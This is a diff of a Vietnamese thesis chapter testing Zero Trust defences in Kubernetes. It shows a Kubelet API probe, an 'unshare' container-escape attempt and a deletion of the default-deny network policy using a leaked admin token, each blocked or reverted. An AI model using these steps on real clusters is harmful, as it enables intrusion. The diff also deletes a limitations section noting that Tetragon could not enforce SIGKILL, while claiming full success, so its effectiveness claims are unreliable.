+\textbf{Giai đoạn 3: Khai thác lỗ hổng Kernel thoát Sandbox (T1611):}\\
+Khi các cổng API bị chặn đứng hoàn toàn, hacker chuyển sang phương án bạo lực: khai thác lỗ hổng Zero-day ở tầng nhân Linux hoặc Container Runtime để thoát khỏi ranh giới filesystem và cgroups cô lập của container (\texttt{Escape to Host --- T1611}). Để vượt ngục thành công, mã độc bắt buộc phải thực thi các lời gọi hệ thống (\texttt{syscall}) đặc quyền như \texttt{unshare}, \texttt{ptrace}, \texttt{mount}.
+
+Hệ thống ZTA ngăn chặn hành vi vượt ngục này thông qua 2 lớp bảo vệ runtime:
+\begin{itemize}
+    \item \textbf{Seccomp Profile (Lớp bảo vệ tĩnh):} Pod Security Admission cấp độ \texttt{Restricted} bắt buộc áp dụng hồ sơ \texttt{RuntimeDefault} Seccomp. Hệ điều hành Kernel sẽ chặn đứng ngay lập tức các syscall nhạy cảm như \texttt{unshare} từ mức phân cấp thấp nhất, trả về mã lỗi \texttt{EPERM} (Operation not permitted).
+    \item \textbf{Tetragon eBPF (Lớp bảo vệ động):} Nếu hacker tìm cách lách qua syscall được phép, Tetragon sẽ theo dõi phả hệ tiến trình ở mức Ring 0. Khi có hành vi dị thường (như một tiến trình PHP cố gắng ghi đè cgroup), Tetragon sẽ phát tín hiệu \texttt{SIGKILL} hạ gục tiến trình ngay lập tức trước khi nó kịp hoàn tất thoát sandbox.
+\end{itemize}
+
+\textbf{Minh chứng thực nghiệm:}\\
+Thử nghiệm quét Kubelet API từ container \texttt{job-service} và gọi syscall đặc quyền chứng minh các cơ chế ZTA hoạt động cực kỳ hiệu quả:
+
+\begin{listing}[H]
+\begin{minted}[fontsize=\footnotesize]{bash}
+# 1. Thử kết nối trực tiếp đến Kubelet API cổng 10250 trên Node vật lý
+$ kubectl -n job7189-apps exec job-service-65f9f7cfcb-xg95r -c app -- \
+    curl -sS --connect-timeout 2 http://100.114.68.15:10250
+curl: (28) Failed to connect to 100.114.68.15 port 10250 after 2002 ms: Timeout was reached
+[exit=28]  # Lệnh timeout hoàn toàn do eBPF chặn đứng kết nối đến Host-level IP
+
+# 2. Thử thoát khỏi sandbox bằng syscall unshare từ bên trong Pod
+$ kubectl -n job7189-apps exec job-service-65f9f7cfcb-xg95r -c app -- unshare -m
+unshare: unshare failed: Operation not permitted
+[exit=1]   # Syscall bị Seccomp chặn đứng và trả về lỗi Operation not permitted
+\end{minted}
+\caption{Kết quả quét Kubelet API bị TIMEOUT và syscall bị Seccomp chặn đứng}
+\label{lst:kb9_syscall_cmd}
+\end{listing}
+
+
+%--------------------------------------------------------------
+\subsection{Kịch bản 10: Đầu độc chính sách mạng và Tự phục hồi GitOps}
+\label{subsec:kb10_iac_poisoning}
+%--------------------------------------------------------------
+
+\textbf{Bề mặt tấn công:} Quy trình quản trị GitOps Pipeline và tính toàn vẹn trạng thái cấu hình của hệ thống dưới dạng hạ tầng như mã (Infrastructure as Code - IaC).
+
+\textbf{Giai đoạn 1: Xâm nhập CI/CD và Đầu độc chính sách bảo mật:}\\
+Nhận thấy các cuộc tấn công tại môi trường runtime đều bị các chốt chặn Zero Trust vô hiệu hóa hoàn toàn, hacker chuyển hướng tấn công sang pha thiết kế và quản lý hệ thống (Shift-Left Attack). Hacker đánh cắp Access Token của một lập trình viên có quyền truy cập CI/CD hoặc khai thác lỗ hổng bảo mật trên máy chủ kiểm soát mã nguồn để gửi các commit độc hại (\texttt{Compromise Software Dependencies and Development Tools --- T1195.001}). 
+
+Mục tiêu của kẻ tấn công là chỉnh sửa trực tiếp tệp YAML của chính sách \texttt{CiliumNetworkPolicy} (\texttt{default-deny-all}), thay đổi cấu hình Ingress/Egress từ các dải IP giới hạn thành wildcard \texttt{0.0.0.0/0} hòng mở toang các cổng mạng nội bộ, vô hiệu hóa hoàn toàn năng lực bảo vệ mạng của hệ thống ZTA (\texttt{Impair Defenses: Disable or Modify Cloud Firewall --- T1562.007}).
+
+\textbf{Giai đoạn 2: Cơ chế kiểm duyệt Admission Control tại API Server:}\\
+Khi quy trình CI/CD tự động thực hiện lệnh triển khai cấu hình độc hại (`kubectl apply` hoặc `helm upgrade`), yêu cầu ghi trạng thái gửi đến Kubernetes API Server bắt buộc phải đi qua phễu lọc Mutating và Validating Admission Controllers.
+
+Tại đây, chính sách an ninh cấp cụm được định nghĩa nghiêm ngặt thông qua OPA Gatekeeper lập tức can thiệp. Validating Webhook của Gatekeeper kiểm duyệt cấu hình YAML và đối chiếu với ràng buộc an ninh: *“Nghiêm cấm tạo hoặc cập nhật bất kỳ NetworkPolicy nào có EndpointSelector trống kết hợp với luật Ingress/Egress dải wildcard 0.0.0.0/0 trong các namespace nghiệp vụ”*. Yêu cầu triển khai độc hại lập tức bị API Server từ chối thẳng thừng với lỗi \texttt{HTTP 403 Forbidden}, ngăn chặn thành công kỹ thuật \texttt{T1562.007} ngay từ cửa ngõ nạp cấu hình.
+
+\textbf{Giai đoạn 3: Phá hoại thủ công tại Runtime và Vòng lặp tự phục hồi GitOps:}\\
+Bị chặn đứng ở CI/CD Pipeline, hacker đổi sang kịch bản nâng cao: lạm dụng thành công một token quản trị viên bị rò rỉ và truy cập trực tiếp vào API Server thông qua giao diện CLI để gõ lệnh xóa trực tiếp tài nguyên mạng cốt lõi:
+
+\begin{listing}[H]
+\begin{minted}[fontsize=\footnotesize]{bash}
+$ kubectl delete cnp default-deny-all -n job7189-apps
+ciliumnetworkpolicy.cilium.io "default-deny-all" deleted
+\end{minted}
+\caption{Hành vi cố tình xóa thủ công chính sách default-deny}
+\label{lst:kb10_del_cmd}
+\end{listing}
+
+Mặc dù lệnh xóa được thực thi thành công do tài khoản quản trị viên bị lạm dụng có đủ thẩm quyền, hạ tầng ZTA sở hữu cơ chế bảo vệ tối thượng chống trôi dạt trạng thái (Anti-Policy Drift) để đảm bảo tính sẵn sàng cao và an toàn tuyệt đối. 
+
+Để chứng minh tính hiệu quả khoa học, chúng ta thực hiện đối chứng chuỗi hành vi trước và sau khi kích hoạt cơ chế đồng bộ tự phục hồi (Self-healing Workflow):
+\begin{enumerate}
+    \item \textbf{Trạng thái trôi dạt (Drifted State):} Ngay sau khi lệnh xóa được gửi lên, chính sách \texttt{default-deny-all} tạm thời biến mất khỏi cụm trong vài giây. Trong khe hở thời gian cực ngắn này, một kết nối probe trái phép (vốn bị chặn bởi default-deny) cố gắng gửi đi.
+    \item \textbf{Chu kỳ đối chiếu (Reconciliation Loop):} GitOps Controller (ArgoCD) liên tục theo dõi trạng thái mong muốn (Desired State) lưu trữ được ký số bảo mật trên Git Repository và trạng thái runtime thực tế (Actual State) trên cụm. Phát hiện sự lệch pha nghiêm trọng, GitOps Controller lập tức kích hoạt hành động khôi phục tự động (Auto-Sync).
+    \item \textbf{Trạng thái phục hồi (Healed State):} Chỉ trong vòng 3 giây, GitOps Controller tự động tái tạo lại chính xác chính sách mạng \texttt{default-deny-all} từ kho Git an toàn vào cụm. Mọi probe thử nghiệm trái phép sau đó lập tức bị chặn đứng và Hubble tiếp tục báo log DROP. Khe hở bảo mật bị khép lại hoàn toàn tự động mà không cần can thiệp thủ công từ quản trị viên.
+\end{enumerate}
+
+\begin{listing}[H]
+\begin{minted}[fontsize=\footnotesize]{bash}
+# Log của GitOps Controller phát hiện trạng thái trôi dạt (Drift) và phục hồi tự động
+$ kubectl -n argocd logs sts/argocd-application-controller | grep "default-deny-all"
+time="2026-05-28T09:31:42Z" level=info msg="Reconciling CiliumNetworkPolicy default-deny-all"
+time="2026-05-28T09:31:45Z" level=info msg="Successfully recreated CiliumNetworkPolicy"
+\end{minted}
+\caption{Log của GitOps Controller ghi nhận chu kỳ Reconciliation tự khôi phục}
+\label{lst:kb10_recover_res}
+\end{listing}
 
 % ============================================================
-\section{Đánh giá mức độ tuân thủ và Hạn chế}
-\label{sec:tenets_matrix}
+\section{Phân tích tổng hợp kết quả}
+\label{sec:analysis}
 % ============================================================
 
-Kết quả thử nghiệm (36/38 test case thành công) khẳng định hệ thống đáp ứng đầy đủ \textbf{7/7 nguyên lý của NIST SP 800-207}. Khung kiến trúc 5 lớp đã bảo vệ thành công các API nhạy cảm, giảm 98\% bán kính ảnh hưởng khi bị xâm nhập, và tự động thu hồi mật khẩu.
-
-Tuy nhiên, với tính chất là một mô hình thử nghiệm (PoC), hệ thống còn một số hạn chế và hướng phát triển cho môi trường Enterprise:
-
-\begin{table}[H]
-\centering
-\caption{Giới hạn của hệ thống PoC và hướng phát triển Enterprise}
-\label{tab:limitations}
-\small
-\renewcommand{\arraystretch}{1.3}
-\begin{tabularx}{\textwidth}{|p{3.2cm}|>{\raggedright\arraybackslash}p{4cm}|X|}
-\hline
-\textbf{Thành phần} & \textbf{Trạng thái PoC} & \textbf{Hướng phát triển (Future Work)} \\
-\hline
-\textbf{Lưu trữ bí mật} & Vault chạy ở Dev mode, khoá lưu trong RAM. & Chuyển sang sử dụng Raft Storage có PVC hoặc tích hợp Cloud KMS để Auto-unseal. \\
-\hline
-\textbf{Bảo mật luồng Message Broker} & Kafka đang giao tiếp Plaintext nội bộ. & Bật SASL/SSL; cấp x.509 certificate qua SPIRE cho mỗi Kafka client. \\
-\hline
-\textbf{Tương thích Kernel eBPF} & Tetragon v1.2.0 chưa thể thực thi \texttt{SIGKILL}: BPF object \texttt{bpf\_multi\_kprobe\_v61.o} compile cho kernel 6.1, nhưng host chạy kernel 6.8.0-111 (BPF verifier reject: \textit{load program: invalid argument}). & Nâng cấp Tetragon \textgeq v1.4+ (support kernel 6.8 với object \texttt{bpf\_multi\_kprobe\_v66.o}, \texttt{v612.o}) hoặc downgrade kernel host về 6.1. \\
-\hline
-\textbf{Tối ưu API Gateway} & Kong pre-function OPA plugin: latency P50$\sim$188ms, P95$\sim$425ms, P99$\sim$630ms (path 403 OPA-deny anonymous). OPA warm-path riêng lẻ \texttt{\textasciitilde}1.3ms, nhưng HTTP handshake + request buffering tạo overhead thực tế \textasciitilde 10x. & Tối ưu hóa Connection Pooling (Keep-alive) giữa Kong và OPA; disable request buffering; hoặc migrate OPA vào Kong plugin native. \\
-\hline
-\textbf{Bảo mật thiết bị (Device Posture)} & Ngoài phạm vi thực nghiệm. & Tích hợp giải pháp EDR/MDM tại Client để xác thực tình trạng thiết bị trước khi cấp quyền. \\
-\hline
-\end{tabularx}
-\end{table}
-
-\textbf{Tổng kết:} Đồ án đã chứng minh được tính khả thi và hiệu quả của việc ứng dụng Zero Trust bảo mật Microservices. Các giới hạn công nghệ hiện tại đều có lộ trình khắc phục rõ ràng, không làm ảnh hưởng đến tính đúng đắn của khung kiến trúc đề xuất.
+Tổng hợp kết quả, cả 10 kịch bản đều chứng minh hệ thống đạt khả năng phòng thủ chuyên sâu qua nhiều tầng lớp, hạn chế tối đa các kỹ thuật theo MITRE ATT\&CK.
